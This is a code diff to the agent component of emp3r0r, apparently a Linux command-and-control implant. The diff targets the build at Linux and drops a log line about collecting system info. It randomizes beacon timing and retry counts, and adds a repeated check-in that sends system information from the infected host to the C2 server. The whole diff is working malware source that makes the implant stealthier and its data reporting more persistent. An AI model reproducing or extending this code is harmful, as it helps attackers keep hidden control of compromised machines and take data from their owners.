@@ -1,3 +1,6 @@
+//go:build linux
+// +build linux
+
 package agent
 
 import (
@@ -20,13 +23,13 @@ import (
 	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
 // CheckIn poll CC server and report its system info
 func CheckIn() error {
 	info := CollectSystemInfo()
-	log.Println("Collected system info, now checking in...")
 
 	sysinfoJSON, err := json.Marshal(info)
 	if err != nil {
@@ -132,12 +135,12 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// check for CC server's response
 	go func() {
-		log.Println("check CC response: started")
+		log.Println("Check CC response: started")
 		for ctx.Err() == nil {
 			// read response
 			err = in.Decode(&msg)
 			if err != nil {
-				log.Print("check CC response: JSON msg decode: ", err)
+				log.Print("Check CC response: JSON msg decode: ", err)
 				break
 			}
 			payload := msg.Payload
@@ -162,7 +165,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 			err = out.Encode(msg)
 			if err != nil {
 				log.Printf("agent cannot connect to cc: %v", err)
-				time.Sleep(1 * time.Second)
+				util.TakeASnap()
 				continue
 			}
 			return true
@@ -172,10 +175,14 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// send hello every second
 	for ctx.Err() == nil {
-		time.Sleep(1 * time.Second)
-		if !sendHello(10) {
-			log.Print("sendHello failed after 10 tries")
+		util.TakeASnap()
+		if !sendHello(util.RandInt(1, 10)) {
+			log.Print("sendHello failed")
 			break
+		}
+		err = CheckIn()
+		if err != nil {
+			log.Printf("Updating agent sysinfo: %v", err)
 		}
 	}
 
